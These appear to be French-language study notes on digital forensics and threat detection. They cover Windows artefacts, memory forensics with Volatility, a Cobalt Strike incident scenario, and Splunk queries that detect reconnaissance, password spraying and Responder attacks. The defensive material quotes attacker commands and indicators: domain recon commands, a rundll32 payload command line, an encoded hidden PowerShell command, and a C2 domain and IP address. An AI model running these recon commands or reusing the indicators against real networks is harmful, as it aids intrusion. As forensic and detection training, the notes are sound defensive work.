Événements d'application : Journaux provenant de logiciels spécifiques, souvent utiles pour identifier des tentatives d'exploitation.
Artefacts d'exécution

Les artefacts d'exécution documentent les traces des programmes et scripts exécutés, offrant un aperçu des actions des utilisateurs et des activités de malwares. Les artefacts notables incluent :
Fichiers Prefetch : Suivent les métadonnées d'exécution (chemins des fichiers, nombre d'exécutions).
Shimcache : Enregistre l'exécution des programmes pour la compatibilité, utile pour identifier les activités récentes.
Amcache : Stocke les détails des exécutables (chemins des fichiers, signatures numériques, dernière exécution).
UserAssist : Suit les applications exécutées par l'utilisateur, affichant les noms, les comptes et les horodatages.
Listes RunMRU : Enregistre les commandes et programmes récemment exécutés.
Jump Lists : Documente les fichiers et tâches récents associés aux applications.
Fichiers de raccourci (LNK) : Fournissent les chemins d'exécution, les horodatages et les interactions avec l'utilisateur.
Éléments récents : Suivent les fichiers récemment accédés.
Journaux des événements Windows : Enregistrent les événements liés à la création et la terminaison des processus.
Persistance sur Windows

Les méthodes de persistance permettent aux attaquants de conserver l'accès à un système. Ces méthodes exploitent des composants système comme les clés de registre, les tâches planifiées et les services.
Clés de registre pour la persistance
Run/RunOnce :
HKEYCURRENTUSER\Software\Microsoft\Windows\CurrentVersion\Run
HKEYLOCALMACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Clés WinLogon :
HKEYLOCALMACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
Clés de démarrage :
HKEYCURRENTUSER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
Tâches planifiées (Schtasks)

Les tâches planifiées dans C:\Windows\System32\Tasks sont stockées sous forme de fichiers XML, détaillant les horaires et les commandes des tâches. Ces fichiers doivent être examinés pour repérer les entrées suspectes.
Services

Les services Windows exécutent des processus en arrière-plan. Les acteurs malveillants peuvent créer ou modifier des services pour maintenir la persistance. La clé de registre pour les services est : HKEYLOCALMACHINE\System\CurrentControlSet\Services.
Forensique des navigateurs web

L'analyse des navigateurs web peut révéler les habitudes de navigation, les interactions de l'utilisateur et des actions potentiellement nuisibles. Les artefacts clés incluent :
Historique de navigation : Suit les sites visités, les horodatages et la fréquence.
Cookies : Stocke les détails de session, les préférences et les données d'authentification.
Cache : Contient les pages web et images en cache, montrant les sites accédés même si l'historique a été effacé.
Favoris : Indique les pages fréquemment visitées.
Historique des téléchargements : Liste les fichiers téléchargés, leurs URL d'origine et les horodatages.
Données de remplissage automatique : Stocke les informations pour les formulaires (par exemple, noms, adresses).
Données de session : Suivent les sessions actives, les onglets et les fenêtres ouvertes.
Extensions et modules complémentaires : Liste des extensions installées et leurs configurations.
SRUM (System Resource Usage Monitor)

Introduit dans Windows 8, SRUM suit l'utilisation des applications et des ressources. Localisé dans C:\Windows\System32\sru\sru.db, cette base de données SQLite enregistre les profils des applications et l'utilisation des ressources, aidant à :
Profilage des applications : Affiche les applications exécutées et leurs chemins.
Consommation des ressources : Enregistre l'utilisation du CPU, du réseau et de la mémoire.
Reconstruction de la chronologie : Construit une chronologie de l'utilisation des applications et des événements système.
Contexte utilisateur et système : Associe les activités à des utilisateurs spécifiques, ce qui aide à identifier les acteurs malveillants.
Détection des malwares : Suivit les modèles inhabituels d'applications ou de ressources, ce qui peut indiquer la présence de malwares.
Réponse aux incidents : Fournit des informations rapides sur les activités récentes pour une réponse rapide aux menaces.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Evidence Acquisition Techniques &amp; Tools</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80fb-96a0-f4103302a8cc"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Acquisition de preuves en criminalistique numérique

L'acquisition de preuves est cruciale en criminalistique numérique et implique la collecte minutieuse des données provenant de diverses sources pour en garantir l'authenticité et l'admissibilité légale.
Imagerie Forensique

L'imagerie forensique consiste à créer une copie exacte, bit par bit, des supports de stockage, essentielle pour préserver l'état d'origine des données. Les outils pour l'imagerie forensique incluent :
FTK Imager : Permet de créer des copies parfaites de disques, de visualiser et d'analyser des données sans altération.
AFF4 Imager : Outil open-source prenant en charge plusieurs systèmes de fichiers avec des capacités d'imagerie compressée.
DD et DCFLDD : Utilitaires en ligne de commande sous Unix ; DCFLDD inclut des améliorations spécifiques à la criminalistique, comme le hachage.
Outils de Virtualisation : Utilisés pour acquérir des images de environnements virtuels, souvent via des instantanés.

Exemple : Imagerie avec FTK Imager
Sélectionner Fichier &gt; Créer une Image Disque.
Choisir la source (disque physique/logique) et spécifier la destination.
Définir le type d’image, la fragmentation et la compression, puis démarrer.
Après l’imagerie, FTK Imager vérifie et résume les résultats.

Exemple : Montage de l’image disque avec Arsenal Image Mounter
Lancer Arsenal Image Mounter en tant qu'administrateur.
Monter l’image en mode lecture seule pour maintenir l'intégrité.
L’image apparaît comme un lecteur, par exemple D:.
Extraction de preuves basées sur l’hôte &amp; Triage rapide

Les preuves basées sur l’hôte incluent les artefacts provenant des systèmes d'exploitation comme Windows, générés par l'exécution d'applications, les modifications de fichiers et l'activité des utilisateurs. L'acquisition des preuves se classe selon la volatilité des données :
Données Volatiles : Capturées à partir de la mémoire active, elles incluent le contenu de la mémoire vive, souvent porteur de traces de malwares.
Outils d'acquisition de mémoire :
WinPmem : Outil open-source pour la capture de la mémoire sur Windows.
DumpIt : Outil simple pour les captures de mémoire sur Windows/Linux.
MemDump : Outil CLI pour capturer la RAM du système.
Magnet RAM Capture : Outil gratuit de capture de mémoire de Magnet Forensics.

Exemple : Acquisition de mémoire avec WinPmem

C:\Users\X\Downloads&gt; winpmemminix64_rc2.exe memdump.raw
Données Non-volatiles : Persistant sur disque, elles incluent des entrées de registre, des journaux d'événements Windows, et des artefacts système ou applicatifs.

Triage rapide avec KAPE

KAPE (Kroll Artifact Parser and Extractor) accélère la collecte de preuves en récupérant les artefacts essentiels.
Cibles : Définir les données à collecter, stockées sous forme de fichiers .tkape dans le répertoire KAPE\Targets.
Exécution :
Définir les chemins source (D:) et destination.
Utiliser gkape.exe (interface graphique) pour configurer les options et démarrer la collecte.
Les résultats incluent \$MFT et d'autres répertoires système dans le répertoire de sortie.

Collecte à distance avec EDR &amp; Velociraptor
Solutions EDR : Facilitent la collecte à distance de preuves, avec des capacités de recherche sur les réseaux.
Velociraptor : Utilise des requêtes VQL et des recherches pour collecter des artefacts comme Windows.KapeFiles.Targets.
Extraction de preuves réseau

L’analyse des preuves réseau est fondamentale pour les analystes SOC, impliquant des outils et des sources de données qui capturent et interprètent le trafic réseau.
Capture de Trafic : Des outils comme Wireshark et tcpdump capturent les paquets pour analyser la communication réseau.
Systèmes IDS/IPS : Les systèmes IDS (Intrusion Detection Systems) détectent, tandis que les systèmes IPS (Intrusion Prevention Systems) détectent et bloquent les activités suspectes.
Données de Flux de Trafic : Des outils comme NetFlow fournissent des aperçus du comportement du trafic à un niveau global.
Journaux de Pare-feu : Fournissent des informations sur les tentatives d'exploitation et les tentatives d'accès non autorisées.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Memory Forensics</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80d0-9232-c7eda69e95ac"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Types de données en RAM utiles pour les enquêtes
Connexions réseau
Poignées de fichiers et fichiers ouverts
Clés du registre
Processus en cours
DLLs et pilotes chargés
Historique des commandes de la console
Identifiants des utilisateurs
Artifacts de logiciels malveillants
Configurations système
Processus de criminalistique mémoire
Identification et vérification des processus
Énumérer les processus en cours, valider leurs origines et les comparer aux processus légitimes connus.
Analyse des composants du processus
Examiner les DLLs et poignées associées, rechercher des injections non autorisées.
Revue de l'activité réseau
Analyser les connexions actives, les IP et les domaines pour retracer les communications externes.
Détection des injections de code
Identifier des techniques comme l'hollowing de processus en examinant les anomalies de mémoire.
Détection de rootkits
Identifier des malwares profonds qui s'intègrent dans le système d'exploitation en utilisant des privilèges élevés.
Extraction des éléments suspects
Isoler les composants suspects pour un examen forensique détaillé.
Le cadre Volatility
Vue d'ensemble

Volatility est un outil de criminalistique mémoire open-source utilisé sur diverses plateformes pour analyser des images mémoire sur différents systèmes d'exploitation, tels que Windows, macOS et Linux.
Modules courants de Volatility
pslist : Liste des processus en cours.
cmdline : Affiche les arguments de ligne de commande.
netscan : Identifie les connexions réseau.
malfind : Détecte les codes malveillants dans les processus.
handles : Liste des poignées ouvertes.
svcscan : Analyse des services Windows.
dlllist : Liste des DLLs chargées.
hivelist : Liste des ruches du registre en mémoire.
Exemples d'utilisation de Volatility
Aide à l'utilisation de Volatility :

   vol.py --help
   Lister les processus en cours :

   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 pslist
   Analyse des artefacts réseau :

   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 netscan
   Détecter le code injecté :

   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 malfind --pid=608
   Lister les DLLs chargées pour un processus spécifique :

   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 dlllist -p 1512
   Lister les services Windows :

   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 svcscan
   Détection de rootkits avec les plugins psscan et pslist

Le plugin psscan révèle les processus cachés par des rootkits :

vol.py -f /path/to/rootkit.dump psscan
Analyse mémoire avec Strings
Recherche d’adresses IPv4 :

   strings /path/to/memory.dump | grep -E "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
   Extraction d’adresses e-mails :

   strings /path/to/memory.dump | grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b"
   Artifacts de ligne de commande :

   strings /path/to/memory.dump | grep -E "(cmd|powershell|bash)[^\s]+"
   </code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Disk Forensics</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-802d-b901-c371aaad6f1d"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Fonctionnalités Clés pour la Criminalistique sur Disque
Vue de la Structure des Fichiers : Offre une vue navigable du système de fichiers, permettant un accès rapide aux répertoires et fichiers spécifiques. Cette fonctionnalité est essentielle pour localiser les fichiers suspects.
Visionneuse Hexadécimale : Permet l'inspection détaillée des fichiers au format hexadécimal, particulièrement utile pour analyser des malwares personnalisés ou des exploits spécifiques.
Analyse des Artefacts Web : Permet l’analyse des données liées à la navigation web, comme l'historique de navigation et les fichiers mis en cache, ce qui est crucial pour suivre les activités menant à un incident.
Récupération des Emails : Extrait et affiche les données des emails à partir des images disque, ce qui est souvent précieux lors de l'enquête sur des menaces internes ou des attaques basées sur des communications.
Visionneuse d'Images : Facilite l'affichage des images stockées sur le système, potentiellement utile pour des vérifications de politique ou pour identifier du contenu illégal.
Analyse des Métadonnées : Fournit des informations sur les attributs des fichiers comme les dates de création, les heures de modification et les hachages. Ces détails aident à établir une chronologie et à les mettre en corrélation avec d'autres découvertes, comme les activités malveillantes.

Autopsy : Vue d'Ensemble de l'Outil de Criminalistique

Autopsy est un outil de criminalistique numérique open-source qui repose sur le cadre Sleuth Kit. Il offre une interface conviviale avec des fonctionnalités étendues que l’on retrouve généralement dans les outils commerciaux, telles que :
Navigation des Sources de Données : Permet d'explorer directement les fichiers et répertoires au sein de l'image disque.
Examen des Artefacts Web : Extrait des artefacts de navigation web, comme l'historique, les favoris et les fichiers mis en cache.
Analyse des Périphériques Connectés : Identifie et analyse les périphériques externes connectés au système.
Récupération des Fichiers Supprimés : Récupère les fichiers supprimés en scannant les secteurs du disque à la recherche de données résiduelles.
Recherches par Mots-clés : Permet d'effectuer des recherches approfondies sur le contenu du disque à la recherche de mots-clés spécifiques.
Listes de Mots-clés : Permet de rechercher de manière ciblée en utilisant des listes de mots-clés prédéfinies (par exemple, noms, IPs, indicateurs de compromission).
Analyse de la Chronologie : Cartographie les événements chronologiquement, facilitant ainsi la construction d’une chronologie précise pour l’enquête.

Utilisation Pratique d'Autopsy dans l'Analyse Forensique

Une fois l’image disque chargée dans Autopsy, les artefacts forensiques sont organisés dans la barre latérale, permettant un accès efficace à :
Sources de Données : Vue de tous les fichiers et répertoires.
Artefacts Web : Vue ciblée sur l’historique de navigation et les données associées.
Informations sur les Périphériques : Détails sur les périphériques externes connectés.
Fichiers Supprimés : Fichiers récupérés et fragments marqués comme supprimés.
Recherches par Mots-clés &amp; Listes : Capacités de recherche approfondie.
Analyse de la Chronologie : Affichage organisé et chronologique des événements système, essentiel pour comprendre la séquence des actions menant à un incident.

Pour plus d'informations, consultez [Autopsy - Hack the Box Academy](https://academy.hackthebox.com/module/237/section/2611).</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Rapid Triage Examination &amp; Analysis Tools</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-804b-8eea-c8da71167143"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Téléchargement et Installation

Utilisez le lien .net 4 ou .net 6 sur le site pour les téléchargements.
Alternativement, utilisez PowerShell :

PS C:\Users\johndoe\Desktop\Get-ZimmermanTools&gt; .\Get-ZimmermanTools.ps1
Cela télécharge tous les outils dans C:\htb\dfirmodule\tools.
L'outil suit les mises à jour par le biais de SHA-1 pour faciliter les mises à jour.

Les Temps MAC(b) sur NTFS

Les temps MAC(b) suivent les événements du système de fichiers :
Temps Modifié (M) : Dernière modification du contenu.
Temps Accédé (A) : Dernier accès au fichier.
Temps Changé (C) : Modifications de la MFT.
Temps de Création (b) : Heure de création originale du fichier.
Exemple de Commandes

Utilisation de MFTECmd pour Inspecter les Fichiers \$MFT :

PS C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6&gt; .\MFTECmd.exe -f 'C:\Users\johndoe\Desktop\forensicdata\kapeoutput\D\$MFT' --de 0x16169
Aperçu des Outils d'Investigation
Structure du Fichier MFT

La Master File Table (MFT) est essentielle pour suivre les fichiers sur un volume NTFS.
Les attributs du MFT comprennent \$STANDARD\INFORMATION et \$FILE\NAME.
Journaux des Événements Windows

EvtxECmd pour analyser les journaux EVTX en CSV ou JSON :

PS C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6\EvtxeCmd&gt; .\EvtxECmd.exe -f "chemin\vers\log.evtx" --csv "cheminsortie"
Vous pouvez utiliser Event Query Language (EQL) pour interroger des journaux au format JSON.
Analyse du Registre Windows

RegRipper extrait des données spécifiques via des plugins :

PS C:\Users\johndoe\Desktop\RegRipper3.0-master&gt; .\rip.exe -r "C:\chemin\vers\hive" -p pluginname
Registry Explorer fournit un accès graphique au registre.
Artefacts d'Exécution de Programme

Analyse Prefetch avec PECmd :

PS C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6&gt; .\PECmd.exe -f C:\chemin\vers\fichierprefetch.pf
ShimCache et Amcache : Accédez à ces artefacts via Registry Explorer pour l'historique des programmes.
Analyse Avancée
Transcriptions PowerShell : Examinez les commandes PowerShell inhabituelles.
Surveillance des API : Les appels comme getenv, CreateProcessA et RegOpenKeyExA montrent des détails d'interaction.
Commandes Clés pour l'Analyse Forensique
Commandes PowerShell

Examinez les commandes réseau, les commandes encodées et les modules inhabituels.
Autres Scripts et Commandes Importants

Création du format JSON EQL :

PS C:\Users\eqllib-master\utils&gt; Get-WinEvent -Path "log_path" -Oldest | Get-EventProps | ConvertTo-Json</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Practical Digital Forensics Scenario</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8014-b0c3-fc69b97721d5"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Accès au système cible
Accès via RDP : Connectez-vous à l'IP cible avec les identifiants fournis.
Emplacements des preuves
Vidage mémoire : C:\Users\johndoe\Desktop\memdump\PhysicalMemory.raw
Artifacts de triage rapide :
C:\Users\johndoe\Desktop\kapefiles
C:\Users\johndoe\Desktop\files
Image disque complète : C:\Users\johndoe\Desktop\fulldisk.raw.001
Données de disque analysées : C:\Users\johndoe\Desktop\MalwareAttack
Notes
Analyse avec Autopsy : Réaliser l'analyse dans le dossier C:\Users\johndoe\Desktop\MalwareAttack.
Environnement idéal pour la criminalistique : L'analyse se fait directement sur le système compromis pour des raisons de rapidité, bien qu'il soit recommandé d'utiliser un environnement séparé.

Analyse mémoire avec Volatility v3
Identification du profil mémoire

Pour obtenir les détails du système d'exploitation et du noyau à partir du vidage mémoire :

python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.info
Exemple de sortie :

Variable           | Valeur
-------------------|------------------------------------------------
Kernel Base        | 0xf80150019000
DTB                | 0x1ad000
Symbols            | file:///C:/Users/johndoe/Desktop/...
Is64Bit            | True
SystemTime         | 2023-08-10 09:35:40
NtSystemRoot       | C:\Windows
NtMajorVersion     | 10
NtMinorVersion     | 0
Détection de code injecté

Pour trouver les régions mémoire des processus contenant potentiellement du code injecté :

python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.malfind
Exemple de sortie :

Processes with PAGEEXECUTEREADWRITE memory:
    PID 3648 (rundll32.exe), PID 6744 (powershell.exe), PID 5468 (rundll32.exe)
Explication de PAGE\EXECUTE\READWRITE :
Ce type de permission permet à la fois l'exécution et la modification du code en mémoire, ce qui est rarement utilisé par des applications légitimes, mais couramment observé dans des malwares.
Identification des processus en cours

Lister les processus en cours :

python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.pslist
Exemple de sortie :

PID   PPID   ImageFileName   CreateTime                    SessionId
4     0      System          2023-08-10 00:22:53.000000   N/A
3648  7148   rundll32.exe     2023-08-10 09:15:14.000000   1
6744  908    powershell.exe   2023-08-10 09:21:16.000000   1
5468  7512   rundll32.exe     2023-08-10 09:23:15.000000   0
Visualisation de l'arbre des processus

Pour voir les relations parent-enfant des processus :

python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.pstree
Cela permet d'identifier les processus enfants suspects lancés par des processus légitimes comme rundll32.exe sous explorer.exe.
Identification des lignes de commande des processus

Pour récupérer les arguments de ligne de commande des processus :

python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.cmdline
Exemple de sortie :

PID   Process        Args
416   csrss.exe      %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows ...
3648  rundll32.exe   C:\Windows\System32\rundll32.exe payload.dll,StartW
6744  powershell.exe PowerShell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcAL...
Extraction de la mémoire du processus et utilisation de YARA

Pour analyser le processus avec PID 3648, utilisez le plugin windows.memmap pour extraire toutes les pages mémoire résidentes de ce processus :

python vol.py -q -f ../memdump/PhysicalMemory.raw windows.memmap --pid 3648 --dump
Sortie :

0xf8016d0e9000  0x2077d000      0x3000  0x1bde4000      pid.3648.dmp
... (continues with memory pages)
L'image mémoire pid.3648.dmp sera stockée dans le répertoire C:\Users\johndoe\Desktop.
Analyse avec YARA

Pour scanner le vidage mémoire avec les règles YARA :

$rules = Get-ChildItem C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules | Select-Object -Property Name
foreach ($rule in $rules) {C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\yara64.exe C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules\$($rule.Name) C:\Users\johndoe\Desktop\pid.3648.dmp}
Sortie de YARA :

HKTLCobaltStrikeBeaconStrings
CobaltStrikeSleepDecoderIndicator
WiltedTulipReflectiveLoader
Identification des DLLs chargées

Examinez les DLLs chargées avec le plugin windows.dlllist :

python vol.py -q -f ../memdump/PhysicalMemory.raw windows.dlllist --pid 3648
Sortie :

payload.dll at E:\payload.dll, suggesting possible external or ISO origin.
Identification des poignées de fichiers

Utilisez windows.handles pour afficher les fichiers et les entrées de registre accédées :

python vol.py -q -f ../memdump/PhysicalMemory.raw windows.handles --pid 3648
Exemple de sortie :

Access to \Device\HarddiskVolume3\Users\johndoe\Desktop
Analyse des artefacts réseau

Pour analyser les connexions réseau avec windows.netstat :

python vol.py -q -f ../memdump/PhysicalMemory.raw windows.netstat
Exemple de sortie :

chrome.exe, WWAHost.exe, rundll32.exe
Utilisez windows.netscan pour une analyse réseau plus approfondie :

python vol.py -q -f ../memdump/PhysicalMemory.raw windows.netscan
Exemple de sortie :

Le processus suspect (PID 3648) communique avec 44.214.212.249 via le port 80.
Analyse des données de l'image disque et triage rapide
Recherche de mots-clés avec Autopsy
Ouvrir Autopsy et accéder au dossier C:\Users\johndoe\Desktop\MalwareAttack.
Rechercher payload.dll et prioriser par date de création.
Extraction : Faites un clic droit sur Finance08062023.iso dans le dossier Downloads et sélectionnez Extraire le(s) fichier(s).
Identification des informations de téléchargement Web

La présence de .Zone.Identifier via un flux de données alternatif (ADS) confirme que le fichier provient d'Internet.

L'URL source identifiée dans les artefacts Web est : letsgohunt[.]site.

Analyse de la configuration du Beacon Cobalt Strike
Utilisez CobaltStrikeParser pour analyser la configuration du beacon avec le fichier payload.dll :

python parsebeaconconfig.py E:\payload.dll
Configurations clés extraites :

BeaconType: HTTP, Port: 80, C2Server: letsgohunt.site,/load
Autres champs notables : HttpGetMetadata, bUsesCookies, Spawntox64.
Mécanismes de persistance avec Autoruns

Analysez les entrées dans C:\Users\johndoe\Desktop\files\johndoeautoruns.arn :

Une entrée trouvée :

Path: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Image: C:\ProgramData\svchost.exe
Identification des hachages de fichiers et VirusTotal

Pour identifier le hachage de photo433.exe :

PS C:\Users\johndoe&gt; Get-FileHash -Algorithm SHA256 "C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Users\johndoe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\photo443.exe"
Analyse des tâches planifiées et du timestomping

Les incohérences entre les horodatages du MFT et les horodatages de fichier indiquent un possible timestomping.
Analyse des données SRUM

Exfiltration possible de 430526981 octets à partir de \</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Windows Attacks with Splunk</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Common User &amp; Domain Recon</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8076-bb57-d04322b3d8e8"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d’ensemble de la reconnaissance de domaine
Concepts clés
Reconnaissance du domaine Active Directory (AD) : Étape cruciale du cycle d’attaque durant laquelle l’attaquant collecte des informations sur l’environnement AD. Il cherche à identifier :
L’architecture, la topologie réseau et les mécanismes de sécurité.
Les actifs clés : contrôleurs de domaine, comptes utilisateurs, groupes, relations de confiance, unités organisationnelles (OU) et stratégies de groupe (GPO).
Objectif : Identifier des cibles de grande valeur, élever ses privilèges et permettre des mouvements latéraux.

Techniques de reconnaissance avec les commandes Windows natives

Les attaquants peuvent exécuter des commandes comme net group pour obtenir la liste des administrateurs du domaine. Parmi les commandes souvent utilisées :
whoami /all
wmic computersystem get domain
net user /domain
net group "Domain Admins" /domain
arp -a
nltest /domaintrusts

Détection : Surveillez l'exécution de commandes via PowerShell ou l'invite de commandes pour repérer une activité inhabituelle.

Reconnaissance avec BloodHound / SharpHound
BloodHound : Outil open source permettant de visualiser les relations, permissions et chemins d’attaque potentiels dans Active Directory.
SharpHound : Collecteur de données (en C#) utilisé par BloodHound, souvent lancé avec l’option -c all pour un balayage complet.
Méthodes de détection de BloodHound
Requêtes LDAP : Les collecteurs BloodHound effectuent de nombreuses requêtes LDAP sur les contrôleurs de domaine.
Techniques de surveillance :
Événement 1644 : Surveillance des performances LDAP (limité en visibilité).
ETW (Event Tracing for Windows) via Microsoft-Windows-LDAP-Client : Utilisable avec SilkETW et SilkService, compatible avec les règles Yara.
Filtres LDAP prédéfinis : Utilisez ceux recommandés par l’équipe ATP de Microsoft pour détecter les requêtes LDAP typiques liées à la reconnaissance.

Détection de reconnaissance utilisateur/domaine avec Splunk
Objectif

Détecter les activités de reconnaissance typiques dans un intervalle de temps donné, en filtrant le bruit pour se concentrer sur les événements suspects.

Détection via les exécutables Windows natifs

Plage temporelle : earliest=1690447949 à latest=1690450687

index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 earliest=1690447949 latest=1690450687
| search processname IN (arp.exe,chcp.com,ipconfig.exe,net.exe,net1.exe,nltest.exe,ping.exe,systeminfo.exe,whoami.exe) 
  OR (processname IN (cmd.exe,powershell.exe) AND process IN (arp,chcp,ipconfig,net,net1,nltest,ping,systeminfo,whoami))
| stats values(process) as process, min(time) as time by parentprocess, parentprocessid, dest, user
| where mvcount(process) &gt; 3
Explication
Filtrage par index et source : Recherche les événements Sysmon (création de processus - EventID=1) sur la période spécifiée.
Processus ciblés : Se concentre sur les exécutables liés à des commandes de reconnaissance.
Agrégation statistique : Regroupe par processus parent, utilisateur, destination, et liste les processus exécutés.
Filtrage avancé : Ne conserve que les événements où plus de 3 commandes de reconnaissance ont été exécutées par le même processus parent.

Détection de reconnaissance via BloodHound

Plage temporelle : earliest=1690195896 à latest=1690285475

index=main earliest=1690195896 latest=1690285475 source="WinEventLog:SilkService-Log"
| spath input=Message 
| rename XmlEventData. as  
| table time, ComputerName, ProcessName, ProcessId, DistinguishedName, SearchFilter
| sort 0 time
| search SearchFilter="(samAccountType=805306368)"
| stats min(time) as time, max(_time) as maxTime, count, values(SearchFilter) as SearchFilter by ComputerName, ProcessName, ProcessId
| where count &gt; 10
| convert ctime(maxTime)
Explication
Filtrage par index et source : Recherche dans les logs SilkService pendant la période définie.
Extraction des champs XML : Utilisation de spath pour extraire les données structurées du message.
Organisation des résultats : Affiche les champs clés : nom de l’ordinateur, nom du processus, ID du processus, filtres LDAP.
Filtrage par filtre LDAP spécifique : Recherche les filtres contenant samAccountType=805306368, utilisé par BloodHound pour identifier les comptes utilisateurs.
Agrégation et filtrage par fréquence : Signale les processus qui effectuent plus de 10 requêtes LDAP de ce type.
Conversion de l’horodatage : Affiche la date et l’heure du dernier événement au format lisible.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">D<strong>etecting Password Spraying</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-809d-8d33-c758dee992bd"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Aperçu de l'attaque Password Spraying

Password Spraying est une attaque ciblée qui :
Tente un nombre limité de mots de passe courants sur plusieurs comptes d'utilisateurs.
Évite les politiques de verrouillage de compte en utilisant seulement quelques tentatives de mot de passe par compte.
Est conçue pour échapper à la détection en exploitant des mots de passe faibles à travers un large éventail d'utilisateurs, plutôt que de brute-forcer des comptes individuels.

Exemple : Un attaquant utilise l'outil Spray pour tester un ensemble limité de mots de passe sur plusieurs comptes dans un réseau.

Opportunités de détection
Indicateurs basés sur les journaux pour détecter le Password Spraying

Surveiller les journaux Windows pour des motifs de Password Spraying peut permettre de détecter des anomalies, surtout lorsque plusieurs tentatives de connexion échouées (Event ID 4625) provenant de différents comptes utilisateurs sont effectuées depuis une seule adresse IP sur une courte période.

Principaux événements à surveiller pour la détection du Password Spraying :
4625 - Connexion échouée
Suivi des échecs de connexion pour différents comptes provenant d'une seule source.
4768 - Demande de ticket Kerberos (TGT)
ErrorCode 0x6 : Tentatives d'utilisateur invalide.
ErrorCode 0x12 : Tentatives d'utilisateur désactivé.
4776 - Authentification NTLM
ErrorCode 0xC000006A : Utilisateurs NTLM invalides.
ErrorCode 0xC0000064 : Mauvais mot de passe NTLM.
4648 - Tentative de connexion avec des identifiants explicites
Identifie les abus de credentials.
4771 - Échec de pré-authentification Kerberos

Détection du Password Spraying avec Splunk
Plage horaire
Earliest : 1690280680
Latest : 1690289489
Requête Splunk

index=main earliest=1690280680 latest=1690289489 source="WinEventLog:Security" EventCode=4625
| bin span=15m time
| stats values(user) as Users, dc(user) as dcuser by src, SourceNetworkAddress, dest, EventCode, FailureReason
Explication des composants de la requête
Filtrage par Index, Source et Code d'Événement :
Cette partie de la requête se concentre sur les événements du journal de sécurité (WinEventLog:Security) avec EventCode=4625, représentant les échecs de connexion.
Filtre de plage horaire :
La recherche est limitée à une plage horaire spécifique, définie par les horodatages Unix, afin de filtrer uniquement les journaux pertinents.
Binning du temps :
La commande bin regroupe les événements par intervalles de 15 minutes, ce qui aide à détecter les motifs en observant les tentatives de connexion échouées sur des périodes courtes.
Agrégation des statistiques :
La commande stats agrège les événements par champs clés pour analyser les échecs de connexion sur différents comptes.
values(user) as Users : Liste tous les utilisateurs uniques associés aux tentatives de connexion échouées.
dc(user) as dcuser : Compte le nombre d'utilisateurs distincts dans chaque groupe pour identifier plusieurs comptes ciblés depuis une seule adresse IP.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Responder-like Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8057-85f4-ca2f62947f97"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d'ensemble du Poisoning LLMNR/NBT-NS/mDNS

LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service) et mDNS (Multicast DNS) sont des protocoles de résolution de noms utilisés lorsque DNS échoue. Ces protocoles sont vulnérables aux attaques de spoofing et de poisoning, souvent réalisées avec des outils comme Responder. L'attaquant répond aux requêtes de noms non résolus, capturant ainsi le NetNTLM hash de la victime, ce qui peut permettre des compromis supplémentaires des systèmes.

Opportunités de détection des attaques de type Responder
Surveiller le trafic LLMNR et NBT-NS pour des comportements anormaux (par exemple, un grand nombre de requêtes).
Utiliser des techniques de type honeypot pour détecter des réponses réussies pour des hôtes inexistants.
